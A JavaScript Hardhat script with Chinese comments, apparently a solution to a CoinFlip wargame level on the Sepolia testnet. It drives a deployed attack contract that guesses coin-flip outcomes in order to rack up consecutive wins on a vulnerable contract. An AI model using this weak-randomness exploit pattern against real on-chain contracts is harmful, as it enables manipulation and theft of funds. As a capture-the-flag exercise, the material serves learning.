//这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次
const {ethers} = require('hardhat');
require('dotenv').config();
//导入env中的私钥和URL
const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;
//创建合约需要的ABI，地址
const CoinFlip_json = require("../artifacts/contracts/CoinFlip.sol/CoinFlip.json");
const CoinFlip_ABI = CoinFlip_json.abi;
const CoinFlip_Address = '0xC1493cEFf2DC084bB7dbe0a4c265877011Da4454';
//创建合约需要的ABI，地址
const attack_coinflip_json = require("../artifacts/contracts/attack/attack_CoinFlip.sol/attack_CoinFlip.json");
const attack_coinflip_ABI = attack_coinflip_json.abi;
const attack_coinflip_Address = '0xd92Cc85D051E3043dF669b9F17531cf4F08b1865';
//创建provider，wallet
const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
const wallet = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);
//生成合约实例
const CoinFlip = new ethers.Contract(CoinFlip_Address, CoinFlip_ABI, wallet);
const Attack_CoinFlip = new ethers.Contract(attack_coinflip_Address, attack_coinflip_ABI, wallet);
const main = async () => {
    //调用攻击合约的flip函数，flip()函数自动调用_guess()函数来猜值。新概念——交易回执（一个对象），通过交易回执判断该交易是否成功
     let winnumbers;
    const tx1 = await Attack_CoinFlip.flip();
    await tx1.wait();
     let _guess = await Attack_CoinFlip._guess();
    winnumbers = await CoinFlip.consecutiveWins();
    console.log("attack guess",_guess);
    console.log('连续猜对次数为：',winnumbers.toString());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });


